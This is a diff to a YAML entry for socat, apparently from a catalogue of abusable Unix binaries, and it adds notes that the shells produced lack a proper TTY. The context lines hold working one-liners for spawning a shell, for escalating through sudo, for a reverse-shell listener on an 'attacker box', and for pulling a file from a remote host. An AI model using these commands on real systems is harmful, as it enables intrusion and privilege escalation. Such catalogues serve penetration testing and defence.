@@ -1,7 +1,8 @@
 ---
 functions:
   shell:
-    - code: |
+    - description: The resulting shell is not a proper TTY shell and lacks the prompt.
+      code: |
         socat stdin exec:/bin/sh
   reverse-shell:
     - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
@@ -29,7 +30,8 @@ functions:
         LFILE=file_to_save
         socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
   sudo:
-    - code: |
+    - description: The resulting shell is not a proper TTY shell and lacks the prompt.
+      code: |
         sudo socat stdin exec:/bin/sh
   limited-suid:
     - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
